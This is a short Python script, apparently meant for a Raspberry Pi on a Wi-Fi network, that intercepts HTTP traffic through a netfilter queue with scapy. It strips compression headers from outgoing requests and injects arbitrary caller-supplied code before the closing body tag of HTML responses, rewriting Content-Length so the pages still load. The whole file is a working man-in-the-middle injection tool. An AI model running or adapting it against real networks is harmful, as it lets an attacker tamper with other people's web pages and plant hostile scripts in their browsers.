#!/usr/bin/env python3
import scapy.all as scapy
import netifaces
import fnfqueue
import fire
import re


def main(code, count):
    connection = fnfqueue.Connection()
    connection.bind(0).set_mode(0xFFFF, fnfqueue.COPY_PACKET)
    code = code.encode()
    i = 0

    for data in connection:
        pkt = scapy.IP(data.payload)
        if pkt.haslayer(scapy.Raw):     # iptables filters TCP
            load = pkt[scapy.Raw].load
            if pkt[scapy.TCP].dport == 80:
                # modify HTTP requests - disable encoding
                pkt[scapy.IP].src = netifaces.ifaddresses('wlan0')[netifaces.AF_INET][0]['addr'].encode()
                load = re.sub(b"HTTP/1.1", b"HTTP/1.0", load)
                load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
            elif pkt[scapy.TCP].sport == 80:
                # modify HTTP responses - inject code
                load = re.sub(b"</body>",  code + b"</body>", load)
                load = re.sub(b"</BODY>",  code + b"</BODY>", load)
                cl = re.search(b"(?:Content-Length: )([0-9]*)", load)
                if cl is not None and b"text/html" in load:
                    length = cl.group(1)
                    i += 1
                    load = load.replace(length, str(int(length) + len(code)).encode())

            pkt[scapy.Raw].load = load
            del pkt[scapy.IP].len
            del pkt[scapy.IP].chksum
            del pkt[scapy.TCP].chksum

            # workaround
            # should be data.payload = bytes(pkt), then data.mangle()
            # but somehow rpi does not mangle the packet
            # just sending packets with scapy and droping original content
            data.drop()
            scapy.send(pkt, verbose=False)

            if i >= count:
                connection.close()
                return
        else:
            data.accept()

if __name__ == "__main__":
    fire.Fire(main)
